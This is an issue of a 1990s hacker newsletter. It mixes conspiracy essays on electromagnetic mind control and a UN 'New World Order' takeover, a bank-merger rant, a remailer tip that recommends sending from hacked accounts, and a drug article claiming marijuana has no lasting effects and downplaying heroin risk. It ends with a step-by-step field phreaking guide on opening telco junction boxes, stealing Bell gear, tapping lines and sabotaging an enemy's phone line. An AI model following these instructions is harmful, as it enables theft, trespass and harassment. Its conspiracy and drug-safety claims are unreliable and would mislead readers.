INTRODUCTION:  The quote for this issue "The root of everything" conveys a
               different message for each individual.  That's precisely why
               I chose it.  The possible meanings are almost endless.  Thus,
               while you are reading this issue, consciously or subconsciously
               you're forced into thinking about the chosen quote.  I want you
               to try to determine it's meaning, as it relates to the articles
               contained within the pages of the Damage, INC. Newsletter.
               Discovery is an important part of learning that shouldn't be
               overlooked.  It's what gives you the incentive to continue
               exploring and trying to find out how things work.  Therefore, we
               believe that our readers should become more actively involved
               in finding instead of just asking.  Meaning, don't always ask
               us how to do something, try to discover the answers on your own
               by using whatever information was already given to you.

               In case you're still wondering, the quote isn't a reference to
               rooting a system, the root of all evil or the root of all
               problems etc.  It's about the root of information, since
               information is everything.  Afterall, what can't be considered
               information?  It's literally everywhere and everything.
               Furthermore, everything around you is based on information and
               will be in the future as well.  Again, what *isn't* information?
               Technology is information.  Books, Radio, Newspapers, Television,
               speech, text files etc. are all sources and mediums of
               information.  The better the information is that you have, the
               more educated and informed you'll become.  Just be wary of
               misinformation, as it also exists everywhere.  Always consider
               the source of the information that you find.  It's critical that
               you remember to do that first before forming opinions or making
               any judgements.  Sometimes information that's easily obtained
               cannot be verified or is inaccurate.  Again, information that you
               just stumble upon or that's a gift from someone to you can't
               always be trusted.  So, be careful to analyze any information
               that's been given to you instead of just immediately accepting
               it as truth.

               If information is the root of everything, then what are we?
               Well, we are responsible for using information.  It's a tool.
               It is not our master.  Just as, technology isn't the master of
               us...yet.  It is up to humanity to use information and technology
               to benefit us.  You must learn how to use it to your own
               advantage.  Both can destroy your bodies and minds, or they can
               enlighten and empower.  That may sound laughable, but it's true.
               Think about how you use information and technology in your daily
               lives for a minute.  Then think about how the governments, armed
               forces and world leaders use both and you'll understand what I'm
               saying.  It's a double edged sword and it all depends on who's
               holding the weapon.  Whoever holds the sword in their hands has
               the technology and information on how to use it.  The difficult
               part is knowing how to use it wisely.

               Information isn't free.  It never has been and never will be
               freely given to anyone that wants to have access to it.  There
               will always be people that will take measures to conceal the
               information that they have, control it, and be stealthful about
               using it so that it's not leaked or exposed.  That's the way it
               is.  As for technology, it's guarded, bought, sold, exchanged
               and traded by many countries but there's always a price to be
               paid.  That is how things work.  Walls and fences are constructed
               to keep us from knowing, keep us from having access to certain
               technology, or to keep us out entirely.  Basically, they (the
               government, telco, other large corporations, military etc.) don't
               want everyone to have access to the information and technology
               that they possess.  Yet, information is everything.  I realize
               that everyone can't have everything, but there will *always* be
               people around that will try... regardless of the consequences.


BIG BROTHER BASHING -                                         {BIG BROTHER}
Electromagnetic Mind Control Weapons Part 1:

What are Electromagnetic weapons (EM weapons)?  Can they be used for mind
control purposes?  How do they work?  When were they developed, and by who?
Have they ever been used against military personnel or civilians?

EM Weapons and Microwave technology are very powerful weapons, which Big
Brother has and is willing to use against us as a means of control.  I've
watched many Television programs (on TLC, NBC etc.) concerning the development
of EM weapons, read articles and books before writing this article.  Due to
the research that I've done, I feel that I'm qualified to comment on the topic
and share what I have learned.  This article won't be of an extremely technical
nature, since I don't want to bore everyone by including too many dates, names
of military projects and retired military personnel etc.  However, I will
give basic information about "non-lethal" EM weapons, and what Big Brother is
planning to do with this technology.

Research and Development (R&D) of Electromagnetic weapons began in the early
1940s according to the sources that I have available to me.  Then after WWII
ended, known Nazi scientists were brought over to the United States to conduct
further experiments with EM Waves and other technology.  In the same time
period, Japan was conducting its own experiments with EM waves.  Their efforts
were directed towards the construction of a "death ray", capable of blinding
and killing human beings exposed to it from great distances.  Depending on the
length of the waves created, and how they were tuned, they could shut down and
immobilize vehicles or cause damage to the organs (such as the brain and lungs)
of living creatures.  Obviously, the R&D of such weapons didn't end during that
era.  It has continued, and the technology is almost widely used now in the 90s.

I've seen demonstrations of EM weapons and how they can disable helicopters,
planes, tanks, cars etc.  Virtually any complex machine that contains computer
chips and equipment can be shut down almost instantly, just like turning off
a light using this technology.  The most frightening aspect is that the human
body can be affected just as easily, including bodily functions and our mind.
Yes, EM waves *can* and have already been used for mind control purposes.

Have you ever heard the term "behaviour modification" used before?  Some of
the early experiments of that nature took place in Nazi concentration camps.
Nazi Doctors and scientists from Auschwitz and Dachau were recruited by the U.S.
after WWII ended, due to the research they'd conducted on prisoners.  These
events are well documented in The United States' Project PAPERCLIP program.
From the reports that I've read, there were 34 Nazi doctors and scientists
in total that began working in San Antonio, Texas at Randolph Air Force Base.
Then in 1953 the CIA, U.S. Navy and U.S. Army Chemical Corps began conducting
their own programs on unwilling victims, including prisoners, mental patients,
foreigners, ethnic minorities and people that were classified as sexual
deviants.  Most of the experiments were narco-hypnosis and involved chemicals
etc.  Basically, they were still working on developing mind control techniques.

Fast forward to the 1970s.  The American public started to become aware of
the secret programs that were conducted by the U.S. military and CIA during
the previous two decades.  The names of these projects were MKULTRA, MKDELTA,
MKNAOMI, MKSEARCH (MK is understood to stand for Mind Kontrol), BLUEBIRD,
ARTICHOKE and CHATTER.  These programs were designed to develop methods of
citizen mind control and being able to program assassins (the main aim of the
CIA at that time).

During the 1980s while Reagan was President, information wasn't as accessible
and wasn't readily available to anyone.  Nothing changed during Bush's term
of office (1988-1992).  The FOIA (Freedom of Information Act) was bogged down
by bureaucracy and it became costly to search for material that had been
de-classified.  Much of the above material covering the MK programs etc. was
in fact reviewed and re-classified, which made it inaccessible once again to
the public.  However, in 1989 CNN (Cable News Network) aired a program on
EM weapons and showed a U.S. government document that outlined a contingency
plan to use the weapons against "terrorists."  During that same time period,
other stories about microwaves being used against the Palestinians for the
purpose of trying to condition them were being released by the media.

In conclusion, EM weapons present a threat to us all.  Their mind control
capabilities should definitely be viewed as dangerous, in the hands of any
country.  That is, these weapons threaten our very freedom of thought.  What
else carries more importance than that?  I believe the focus should shift
from being on chemical and biological weapons... to ones that have the power
to do more than kill.  Many weapons can kill, but EM weapons can control
minds, which in my opinion is far worse than death.  They present a far greater
threat to us than other advanced weapons, since they have the ability to remove
our very humanity.  They give Big Brother total control, which is what leads
me to believe that the future of free thinkers is grim.  Once our minds are
assaulted and our thoughts are raped, then there will be no way to fight them.
EM Weapons Part 2, covering the 1990s will be included in the next issue.

BLACKENED'S TIP OF THE MONTH -                                  {BLACKENED}
Anonymous Remailers.

Many readers already know about the existence of Anonymous Email, Remailers
etc.  However, I thought I'd write a short article concerning how to find
them, how to use them and how they work for those that don't know.

Obviously, the main reason that someone uses an Anonymous Email service or
a Remailer is to protect their privacy.  Each individual may have many
reasons for wanting to do so.  For example, they might not want their message
to be published or distributed by other means by the receiver with their
name/alias/IP address etc. attached.  They may just want to give someone
information and remain anonymous.  There are several other important reasons
as well, some of which relate to legal issues in which the person doesn't
want to get busted for posting "illegal information".  Therefore, it's done
anonymously to prevent that from happening.  As I'm sure you can see, there
are many uses for them... and as long as they exist, they will be used.  Plus,
anonymous remailers are free to use, which obviously adds to their popularity.
If you live in a corrupt country in which censorship is prevalent (such as
China for example), then I'm sure you wouldn't want them tracing Email back to
you which could be used as "evidence".  It's another way to evade the prying
eyes of Big Brother.  Just remember that Anonymity is your right, but never
assume that they're all completely 'safe' and 'secure'.  Protecting your own
privacy, via using anonymous remailers or any other means is completely legal.
They aren't just for those that are involved in illegal activities.  ;)


How to find anonymous remailers:
-------------------------------

The first two sites contain a list of Anonymous Remailers.  So, check those
out first.  However, if you just want to post a single anonymous message, go
to www.anonymizer.com and send it from there.

List of sites:

www.publius.net/rlist.html                      - Anonymous Remailer list.
www.cs.berkeley.edu/~raph/remailer-list.html    - Anonymous Remailer list.
www.nymserver.com                               - Anonymous Email etc.
www.anonymizer.com                              - Anonymous Email etc.
http://www.replay.com/aba/eternity/             - Eternity service.
http://moloko.insync.net/eternity/              - Eternity service.
http://eternity.internexus.net/                 - Eternity service.
http://eternity.infinetways.net/                - Eternity service.
http://www.replay.com/mail2news/                - Anonymous Remailer.


How to use remailers and how they work:
--------------------------------------

Basically, anonymous remailers strip away the information that's contained
at the top of Email in the header.  Meaning, your real name etc. isn't sent
to the intended receiver of your message.  In that way, they protect your
privacy.  Many anonymous remailers don't send for minutes, hours (or a day or
two with some)... and the time between sending is random.  Therefore, it's more
difficult to trace when the actual message was posted and sent.  Again, that
protects your privacy.  It's to your own benefit since you don't want someone
else to be able to figure out who the sender was and what time the message was
sent.  ;)

As for how to use remailers, it's self-explanatory.  If you can't figure out
how they can be used, then you should read the Anonymous Remailer FAQ first,
and perhaps the alt.privacy.anon-server newsgroup as well.

I suggest that you read the Remailer FAQ, research any remailers and anonymous
Email services first, use PGP encryption and send messages through multiple
remailers if you want better security.  That way, the first remailer doesn't
know what the destination of your message is.  It's also more difficult for it
to be traced back to you if it's been sent through several different remailers.
Using a hacked account or posting from a public terminal that doesn't require
you to login is also a good idea.  Then your real name won't be attached to
anything and no server will have that information.  The most that could be found
out using that method is the IP address (for example, a University's IP name
and address).  However, none of your real information will be attached using
that particular method.  ;)

CONSPIRACIES AND COVERUPS -                                      {COVERUPS}
NWO Part 2:  The UN/NWO connection.

In the last issue (Issue #9, "Search and Destroy.") of the Damage, INC.
Newsletter, I promised that I would reveal some serious United Nations
conspiracies, and how the UN is connected to the implementation the New World
Order.  I will share some information I have collected on how the UN only cares
about world order.

Peacekeepers?
-------------

The perception that most people have about the United Nations is that they are
dedicated to creating world peace.  They believe that delegates sit in global
cooperation and goodwill to form a utopia in which all humans are free and
prosperous.  That is what the elite that control the United Nations want all of
the zombies to believe.

The true mandate of the United Nations is obvious to those that think about
it.  The United Nations is not interested in brokering peace in order to promote
prosperity.  The United Nations is dedicated to maintaining the *world order*,
and the proliferation of a New World Order.

Look at all the current activities where soldiers from various countries wear
the UN uniform.  Is there real peace between the factions in Bosnia?  Or
was world order forced upon them by the UN?  Was a peace agreement being
negotiated for over 25 years on the island of Cyprus?  No, of course not.  Is
that keeping the peace as two warring factions start to heal the wounds of war?
Or is that cracking down on nations that threaten to disrupt world order?
The underlying reason for the conflict is never resolved.  In my opinion, the UN
doesn't send peace keepers to places like Bosnia, etc.  They send in NWO
keepers.

Their primary objective isn't to end conflict and help both sides find a
peaceful settlement.  It is to enforce the United Nations' world order.  The
will of the United Nations is the will of those that want to bring about the New
World Order.  Whether you believe what I am saying or not, will depend on how
you define peace and order.  If you believe that only order can bring peace,
then you must be a believer in the NWO, and the elimination of individual rights
and freedoms it will bring.

The UN helps communists destroy an anti-communist nation.
---------------------------------------------------------

The United Nations is considered, by many naive people, to be a great champion
of global democracy.  This great misconception was formed because of "police
operations" like Korea, when they publicly spoke against communism.  Why would
the United Nations go on a "holy" crusade against communism in Korea and later
in Vietnam, and yet assist the growth of the Soviet influence in other parts
of the world?  To prove this statement, I will tell you about the former nation
of Katanga.

In today's geographic landscape, Katanga no longer exists.  It is now the
Province of Shaba, in African country of Zaire.  In the early 1960s, Katanga was
a province in what was then known as the Belgian Congo.  When Belgium's King
Baudouin formally gave the Belgian Congo independence on June 30, 1960, the
Soviets were ready to place their communist pawn into all key positions in the
new Congolese government.  It is sickening that Soviets and Czech "diplomats"
were lurking around election booths.  They made sure that their communist
candidate, Patrice Lumumba, gained power over the Congo.

Approximately one week after the election, Lumumba enforced the will of his
communist masters.  Men, women, and children were slaughtered.  Newly obtained
freedom was destroyed, and a communist reign of terror took its place.  The
province of Katanga fought back.  Unwilling to be under the thumb of Communists,
President Moise Kapenda Tshombe announced that Katanga was "seceding from
chaos."  Tshombe was known of as a voice against communism in the Congo at that
time.

The Soviets were very quick to condemn Katanga's independence.  To quote Nikita
Khrushchev, "[Tshombe is] a turncoat, a traitor to the interests of the
Congolese people."  Under the direction of the UN, other nations including the
United States also condemned Tshombe, and the nation of Katanga.  A backlash
against Katanga grew quickly within the UN, and on July 14, 1960 the U.S. allied
itself with the USSR by supporting a UN resolution to send UN troops into Congo.

These UN "peacekeepers" weren't sent in to stop Lumumba from massacring the
innocent people in Congo, but to destroy the nation on Katanga by putting it
back under communist Congolese control.  Thousands of soldiers, wearing UN
uniforms left for the Congo four days after the resolution passed.  The conflict
between the nation of Katanga and the UN came to a head in December, 1961.
Soviet and U.S. bombers flew over Elisabethville, Katanga's capital.  Their
first targets were the city's post office and radio station.  It is obvious that
the UN wanted to blackout the media within Katanga.  During this attack, planes
flying under the UN banner also bombed Katanga's hospitals, schools, and
churches.  There is evidence that UN troops slaughtered women and children by
bayonet and machine gun fire.  Belgians and other innocent foreigners also lost
their lives in this conflict.  Unable to stand up to the Soviet and American
military under UN command, the nation of Katanga was overrun and reintegrated
into the communist-controlled Congo.  Despite the testimonies by international
workers in Katanga at the time, the UN and other Illuminati-rooted organizations
proclaimed the entire Congo operation a "great success."  They were successful
in eliminating a small, free African nation that, in their sick, globalist
minds, threatened to hinder their plans for that area.  Do the actions I related
to you above sound like an organization that supports world democracy?  Hmm...

UN preparations to take over the United States of America.
----------------------------------------------------------

Last month, I said that there are plans that haven't even been unleashed upon us
yet, yet the groundwork was laid decades ago.  I will elaborate now.  In 1951,
American servicemen were transferred to Fort MacArthur, California.  After basic
training, they became one of several "Military Government Reserve Units."  On
July 31, 1951, all of the MGRUs took their training one step further.  Nine
California cities: Compton, Culver City, Inglewood, Hawthorne, Huntington Park,
Long Beach, Redondo Beach, South Gate and Torrance were invaded and seized.  The
once-American soldiers were wearing UN uniforms, and their vehicles were marked
with the UN flag.

Newspapers showed pictures of the cities' mayors and police chiefs behind bars.
They were arrested by the UN invasion force.  Many people in Huntington Park
witnessed "UN" soldiers lowering the American flag, and replacing it with the
flag of the United Nations.  Everything was done "by the virtue of the authority
vested in [an officer] by the United Nations Security Council," according to
witnesses that were interviewed.

A second mock invasion occurred on April 3, 1952 in Lampasas, Texas.  Not only
did they duplicate the tactics and credos they used to seize the nine
Californian cities, but they took this operation even further.  Churches were
shut down, schools were taken over, and armed UN guards were posted in all
classrooms.  They also setup a "mock" concentration camp, and rounded up the
citizens in Lampasas.  One reporter saw a teenager get knocked onto the ground.
When the teenager refused to get up, the former American soldier threatened to
remove his teeth with the butt end of his rifle.  Mock trials were also held,
and all U.S. Constitutional rights were ignored and mocked by the UN forces.  In
fact, lists of UN laws were posted all over Lampasas during the invasion.  While
researching these mock invasions, I found one section of these "offenses":
"25.  Publishing or circulating or having in his possession with intent to
publish or circulate, any printed or written matter... hostile, detrimental, or
disrespectful... to the Government of any other of the United Nations."  How do
you like that?  The American soldiers involved in this mock invasion have
blatantly broken their oaths that they swore to protect and uphold the United
States of America.  Lampasas, Texas wasn't the final mock invasion carried
out by the MGRU.

On August 20, 1952, Watertown, New York was invaded and seized.  What happened
in the nine Californian cities and in Lampasas, Texas was also experienced by
the citizens of Watertown.  It would not surprise me as they were herded into
the mock concentration camps that they were forced to watch the lowering of
their American flag, and the raising of the UN flag.

These mock invasions were only a short few years after the formation of the
United Nations.  They were already preparing to impose a New World Order, with
the United Nations being the foundation for the world government.  Just because
these mock invasions took place in the early 1950s doesn't mean that they have
no relevance in 1998.  Globalist groups like the CFR and the Trilateral
Commission have taken control of more military and political positions since the
early 1950s.  

Do you think it that these mock invasions are isolated exercises that occurred
in the 1950s?  If you do, you are wrong.  American cities are still the staging
areas for mock invasions.  On May 4, 1997, the U.S. Army's Special Operations
Command (SOC) performed an urban training "exercise" in Charlotte, North
Carolina.  Section of the cities were shut down by Charlotte police as the
"Military Operations in Urban Terrain" proceeded.

The citizens of Charlotte had no forewarning as a dozen unmarked Black Hawk
helicopters scared the hell out of them.  Many citizens flooded the 911 system,
as well as calling council members and the mayor at their homes, as the sounds
of gunfire and flash-bang grenades disturbed a peaceful night.  Charlotte's city
council did give the Army's SOC consent to initiate this practice operation,
because they believed the Army's lies.  The council were told that the SOC would
be "in and out" and that they would not disturb any citizens.  The U.S. Army SOC
received a lot of negative attention in the press, and Charlotte's Mayor
sent President Clinton a letter expressing his "deep concerns" over the way the
Charlotte citizens were treated.

That is why when it was the Air Force SOC's turn to invade Charlotte, they were
even more discreet.  Their invasion of Charlotte took place on May 28, 1997.  If
you are a fan of NASCAR, you may remember the Coca Cola 600 was being held at
the Charlotte Motor Speedway.  The spin doctors at the SOC turned their invasion
operation into entertainment for the spectators that were there before the race.
The Speedway's mascot was being held by "terrorists."  Zombies in the crowed
cheered as the heavily armed airmen from the SOC arrived on the scene.  Low
flying aircraft cover were also deployed, as well as pyrotechnics and loud
explosions. 

The U.S. Army SOC's invasion of Charlotte, and the Air Force SOC's public
relations invasion are connected.  Both the Army and Air Force SOCs are under
the command of the United States Special Operations Command (SOCOM).  In my
opinion, this operation took place to clean up the mess that the U.S. Army SOC
created within Charlotte in their earlier invasion.

Charlotte wasn't the only city that was used as a staging ground for "urban
terrain exercises."  Pittsburgh, Chicago, Atlanta, Dallas, Detroit, Houston,
Los Angeles, New Orleans, Miami and Seattle have also accommodated SOCOM mock
invasions.  SOCOM claimed that these training operations were needed to prepare
soldiers to stop terrorism.  However, these special operations could also be
a very discreet continuation of the mock UN invasions that took place in the
1950s.  All it would take is for an American President to call a state of
emergency.  The Constitution could then be suspended, and martial law could
be imposed.  These soldiers are already trained to eliminate any resistance
that could be encountered in an urban center.  Then Operation Garden Plot,
and other globalist plans could be implemented.  (I encourage you to search for
information on Operation Garden Plot... or wait for me to write about it in a
future issue of the Damage, INC. Newsletter.)

I hope the information in this article has given you a lot to think about.
Since its birth, the UN has chipped away at the sovereignty of nations, and has
impose the world order desired by the world's most powerful people.
Unfortunately, I only have a limited amount of space to reveal the countless
conspiracies and coverups that surrounds the United Nations.  Once again, I
encourage you to inform yourself.  Form your own opinions based on truthful
information, rather than public or media perceptions.

CORRUPTION AND GREED -                                              {GREED}
When billions aren't enough.

Over the past 10 years, banks and trust companies have become increasingly
bigger and fatter.  We have seen the virtual elimination of interest paid on
savings and combination savings/chequing accounts (which stand at approximately
0.25% or lower).  If you don't have enough money in your account, the bastards
literally make you pay for the "privilege" of allowing them to take your money
and invest it for their own gains.  We have seen an intentional degradation of
service, as we have less human tellers to deal with.  If you are a working
person, it is extremely difficult to arrive at a bank before it closes.  We are
expected to use and trust instant teller or cash machines that occupy a small
space close to the locked doors of your local branch.  Meanwhile, hackers and
phreaks know that telephone banking, electronic tellers/cash machines, and
Internet banking aren't as "secure" as they claim.

Despite the woefully pathetic service North American banks provide, there has
been a proliferation of service charges.  They range from getting charges for
having an account (which I eluded to above), getting charged for obtaining
service from a human teller, getting charged for using a banking machine,
getting charged for using a system like Interac to make a purchase, etc.  I can
say for a fact that small businesses in Canada also face service charges when
depositing money into their business accounts as well.  Despite the tremendous
profits they make from the growing number of service charges, it is not enough
for the greedy, fat cat banks.

Not satisfied with recording multi-billion dollar profits and hundreds of
billions of dollars in assets, the largest North American banks are merging.
Yes, the biggest fat cats are devouring their competitors, forming what TIME
magazine has dubbed "Superbanks".  An example of a so-called "superbank"
occurred on April 13, 1998 when NationsBank from Charlotte, North Carolina
merged with Californian BankAmerica.  The media was told that the merger was
"a $60 billion deal" which formed America's largest bank.
NationsBank/BankAmerica is said to have assets worth $572.2 billion.  That isn't
even the largest merger that occurred in the month of April.  On April 6, 1998
Citicorp and the Travelers Group merged (the deal worth $76 billion) to form
"the World's largest financial services company".  Together, Citicorp/Travelers
Group have assets worth $697.5 billion.  However, approximately $400 billion of
their assets aren't banks, so they don't get the "America's biggest bank" title.

Like always, Canada has followed the lead of the United States.  Canada's
largest chartered bank, the Royal Bank, and the third largest bank, the Bank
of Montreal announced that they want to merge in order to "be competitive
internationally".  What was funny was that they didn't tell Federal Finance
Minister Paul Martin about it.  Days later, the Canadian Imperial Bank of
Commerce (the CIBC is Canada's second largest bank) and the Toronto-Dominion
Bank (TD is the fifth largest) announced that they need to merge as well.  A few
Canadians (like myself) are questioning why these banks need to merge.  In the
first half of 1998, the Royal Bank announced a profit of $925 million; the
Bank of Montreal, $738 million; TD Bank, $600 million; and CIBC, $777 million.
At those numbers, all chartered banks, both the ones that want to merge and the
others that can't find a partner, will record their highest profit levels to
date.  Currently, the mergers require the approval of the Federal Government.
Paul Martin is playing his political cards carefully.  He is afraid of angering
the banks' investors (like the CEOs of the respective banks), but at the same
time he claims to be "looking out for what is best for all Canadians" in regards
to the lack of competition that would result from the mergers.  Hmm...how many
times has a lying politician said that?  :(

Who benefits most from the monopolization of the banking industry?  Definitely
not the public that uses their bank's (or banks') services.  All these mergers
provide are less choice, less service, and more service charges.  That leaves
the people that choose to support these fat cats by investing in bank stocks.
In fact, the people that profit tremendously from bank mergers are the
Chairmen/CEOs of the banks involved.  With tens of thousands of shares each,
plus hundreds of thousands of stock options, they stand to gain millions of
dollars.  Yet these fat cat chairmen, and their underlings are quick to spew
misinformation and lies about their true motives.  In an attempt to sell it to
the zombies, CIBC Chairman/CEO Al Flood said, "Our merger is about product
choice at better value.  It's about forming an innovative new company that will
create more jobs, higher-skill jobs, better-paying jobs and new jobs in
high-growth occupations".  Really Al?  In almost every big business merger,
massive job losses are caused because of what you and other fat cats call "job
redundancy".  These mergers are a new form of downsizing.  They eliminate jobs,
competition and make the banks' largest investors even richer.

As these "superbanks" grow, so does their arrogance.  The largest merged banks
have the assets and cash flow of many small countries.  Therefore, how can they
be regulated by any one government?  Laws created to protect bank customers can
easily be ignored because no potential punishment can hurt the banks.  Is there
anything that can stop them?

Perhaps, but at an extremely high price.  The one thing that these banks fear is
being frozen out of the emerging electronic banking technology.  The high price
I refer to are the new "players" in the electronic financial system that would
take "market share" away from traditional banks.  Such corrupt corporate
entities include the likes of Micro$oft, the largest software company in the
world, will push extremely hard to make sure their software controls the new
financial infrastructure.  Just don't forget about Big Brother, and the type of
control he can have over people, by knowing where every cent of their money is
saved and spent.  All of these fat cats will battle it out.  Whoever wins will
be the primary supplier of the new electronic "legal tender" that they hope will
replace cash.  The thought of huge, supranational corporations being the
suppliers of legal tender is terrible indeed.  It is bad enough what the banks
are doing to obtain pieces of paper that are backed by the country a citizen
lives in.  Regardless of what happens, it is obviously a no-win situation for
everyone but those greedy bastards.

I hope that this article has given you a lot to think about.  I have attempted
to show how these greedy "superbanks" are hurting the general public right now
in order to obtain obscene profits, while providing virtually no return on their
customers' investments.  As banks become bigger, they become even more conceited
and socially irresponsible.  And as Big Brother, the banks, and other greedy
corporations form a cashless, electronic financial system, they'll be able to
sell their own electronic legal tender.  In my opinion, being able to create and
distribute their own "currency" won't be enough.  All of the money in the world
couldn't satisfy the greed of those fat cats.

DRUGS DISCUSSION -                                                  {DRUGS}
Public Propaganda Service Announcements:

In the last issue of the Damage, INC. Newsletter I mentioned a commercial with
a good looking chick that tries to convince people not to use heroin.  Well,
it seems as though Big Brother has stepped up its efforts to brainwash people.
However, their focus seems to be on marijuana more than anything else.  In
fact, they want people to believe that "marijuana=evil".  The emphasis is
definitely on marijuana now in their recent drug campaign.  That is why I'm
writing this article, to educate and inform people about it.  I'm sick of
seeing misinformation spread about marijuana and how it has permanent effects.
That's false.  It doesn't have any lasting side effects at all... but Clinton
and the U.S. Government spend millions of dollars on commercials that either
lie or don't give people all of the facts.  They're meant to brainwash people,
especially kids.  That's their ultimate goal... and that is what should be
fought against.  Let's get to the root of what they're attempting to do.  They
want the anti-marijuana television commercials to influence zombies (which by
the way is not a difficult task) until they've been brainwashed into thinking
that marijuana is an extremely harmful substance.  If they can make people
believe that it's evil, that's even better.  It's more than psychology, it is
in fact zombiology.  Hopefully that makes sense to you.  If you don't question
what they tell you to believe concerning marijuana, then you are a zombie.
That's not an insult, it's just the unavoidable truth.

Television Commercials and Comments:
-----------------------------------

"Another missed opportunity to talk with your child about marijuana."

Now that one is a real classic.  The commercial shows a black man and his son
sitting at the kitchen table eating cereal.  (They're trying to appeal to
all races and reach them by creating multi-racial commercials.  Excellent
tactic.)  However, it won't fool me and shouldn't work on anyone that is
intelligent.  There are *much* bigger problems that parents should discuss with
their children.  For example, is sniffing paint harmful?  Is AIDS deadly?
Can smoking crack kill you?  What about guns and kids?  Can that be a lethal
combination?  Shouldn't young children be educated about other things?  As in,
shouldn't they be warned not to talk to strangers since there are literally
thousands abducted yearly in the United States?  That's just an example of
something that they could be teaching.  In my opinion, they spend/waste too many
dollars trying to combat things such as marijuana that are harmless.  They try
to make it into such a "big problem", yet it's natural.  There's no other word
to describe a plant that grows naturally... and has for millions of years before
man ever walked this earth.  If marijuana is so wrong and shouldn't be used,
then why does it exist in nature?  Can a plant really be deemed 'evil'?  Haha.

"Heroin -- Dying is the easy part."

I don't necessarily disagree with the commercial that has that statement.
However, I'm not telling anyone to try heroin... or not to try it.  That's
your own choice.  The only thing is that they insinuate that heroin use leads
to death.  That simply isn't so.  Sometimes people die due to using heroin.
That's true... but not everyone does.  Not everyone becomes a junkie.  Some
people can experiment with something in moderation without using it continually
and becoming addicted.  So, I feel that commercials such as that generalize
a lot as well as stereotype people that've used it before.

Then there's the one that shows kids in the suburbs.  One skateboards down the
sidewalk and meets his friend to smoke some weed.  It's so realistic.  They
light up a joint while sitting behind a bush on the lawn.  The 'message' they
give is a really lame statistic "40% of kids that smoke marijuana live in
urban areas.  Guess where the other 60% live."  What a potent statement.  Now
only if marijuana that potent were readily available.  ;)

The one that I laughed at most is the commercial that shows band members of
KISS.  They talk about how they've done just about 'everything'.  Meaning,
they were very active drug users.  Yet, it seemed to be geared towards stopping
people from smoking marijuana.  It's as though they're saying that it's the
worst substance to use.  That is what is so laughable.  It makes absolutely
no sense.  Is that the message they want sent?

Obviously, Damage, INC. is just a small voice in comparison to the huge
government propaganda machine... that is willing to spend millions of dollars
to churn out these Public Propaganda Service Announcements.  They can recruit
former drug addicts, athletes, celebrities etc. to read the scripts that they
hand them.  Indeed, their resources are almost limitless.  Yet, I feel that
perhaps articles such as this will have an impact on people.  That is, the
ones that question what they're being told to believe and aren't just naive
little zombies... that are begging to be brainwashed.

H/P INFORMATION AND NEWS -                                            {H/P}


-------------------------------------------------------------------------------
                               Field Phreaking:
                                Junction Boxes
-------------------------------------------------------------------------------

If you want to find some junction boxes, then drive around during the day with
a friend and look for large brown, grey and green metal Bell boxes.  You'll
probably see some smaller (thinner) boxes as well.  Those are TV cable boxes
and they're usually used in small towns and rural areas.  You should be
scouting for a location of a box that's not in an open, visible, obvious area.
Use a pen and a paper to log the street names and specific area of the boxes
that you find.  Avoid boxes in busy areas, like downtown streets in a city.
Most of your searching should take place on roads that start in the city and
lead you out into the country.  Basically, look carefully in subdivisions
that are being built close to the city limits.

Be observant and get to know the area that you're scouting well.  Take note of
bike paths, parks and any undeveloped areas.  In other words, plan an escape
route just in case you are boxing and need to run.  Just make sure the telephone
lines have already been connected in a new housing development.  :)  Otherwise,
the junction box won't be useful to you right away.

Now that you've found a junction box or two that you feel is safe and are
comfortable in using, you'll need to know what clothing to wear when you return
later at night.  First, wear your trashing clothes (dirty, old blue jeans,
a T-shirt and steel toe work boots).  Bring a backpack with you and carry your
tools, Bell helmet etc. in it.  Obviously, if you have Bell helmet and a shirt
with the Bell logo on it, wear them once you're at the box.  Those can be
obtained from Bell vans quite easily, if you know what you're doing.  Sometimes
Bell helmets etc. are left in switching stations too.  Or you can check your
local Bell CO -- the cars, vans and trucks that are parked there for them.
However, it's totally up to you whether or not you want to steal items such as
those, but having them on makes you look less conspicuous.  That is, if you
don't look like a little teenager trying to impersonate an old Bell linesman.
<G>  If you're at a junction box and a telco van is driving by, looks in your
direction and stops then grab your backpack and run.

Since not all junction boxes are the same, be prepared to bring along quite a
few things with you.  You'll need the following tools:

BiC lighter (optional)
Cigarettes (optional)
Codes - local or 1-800 ANI (optional)
Diverter box(es)  (optional)
Laptop (optional)
Voltmeter (optional)
Small Mag-lite flashlight
Medium flashlight
Pen
Scotch tape
Small needle nosed pliers
Larger pliers with a wire cutter/stripper for various gauges of wire.
Screw drivers (flat head, #1 and #2 Phillips)
Case cutter, utility knife or a very sharp pocket knife
Small can of WD-40 (just in case any bolts are rusted)
Adjustable wrench
Ratchet and various sockets (bring a small case)
Lineman's handset (or a beige box with small and medium sized alligator clips)

Gather, organize and store all of the above items in your backpack before you
go out junction boxing.  If you don't have a lineman's handset or a beige box,
then make one.  Beige box plans can be downloaded from any h/p board.

Using the junction box:
----------------------

Okay, you're standing in front of your victim junction box.  Get out your
ratchet and socket set.  In order to open the lock, take the appropriate
socket (whatever one that fits.  Try a 3/8" socket first) and turn the bolt.
If it's rusted, spray some WD-40 on it and wait about 10 seconds until it
has had time to loosen it.  Once the box is finally open, look around inside
of it.  You'll see many terminals aligned in columns.  The screw terminals
should be colored.  At the top of them, you should see a label for Ring (R)
and Tip (T).  The color red indicates Ring and white is Tip.  If there's any
loose wire, tools, Bell manuals, documents, etc. inside of the box then put it
all into your backpack.  You can examine it all once you get home.  If there's
anything written on the inside of the box, write it down on the inside cover of
your cigarette pack.  :)  Sometimes you can find some Bell numbers, codes etc.
that way.  If you're lucky, you may even find a lineman's handset left sitting
there.  Now connect your lineman's handset (or your beige box) to the terminals
that correspond to your box.  (Red to Red and White to White).  You'll hear a
dial tone.  If that doesn't work, try the reverse connection.  If that doesn't
work, then you're a complete moron that doesn't know how to connect clips to
terminals properly.  In that case, return home and try to figure out what you
did wrong.

Start at the top and work your way down.  Dial a local ANI for your NPA, or use
a 1-800 ANI that you know the number of.  Record the number that it reports to
you.  Repeat the process until you've written down 5-10 numbers for terminals.
If the ANI you're using reports the number of ports etc. you can write that down
as well if you want.  I'm sure you can figure out why you might want to have
those numbers after you have returned home.  :)  Or, if you find the (R)ing
and (T)ip terminals of an enemy, you can fuck around with their line.  You can
disconnect it, or connect a wire between the (R) and (T) which will act just
like a busy box.  Their line will be busy 24/7 until that's removed.  Or you
could connect a diverter box to their line once you have the number.

However, you shouldn't do anything like that if you plan on going back to that
same junction box again and again.  As in, if you want that box for long term
use, don't fuck around and change everything.  After the person calls Bell,
they'll eventually find out that the box has been tampered with and it will no
longer be safe to junction box from there.  If you want to know if a telco
employee has been there, put a piece of transparent Scotch tape on the outside
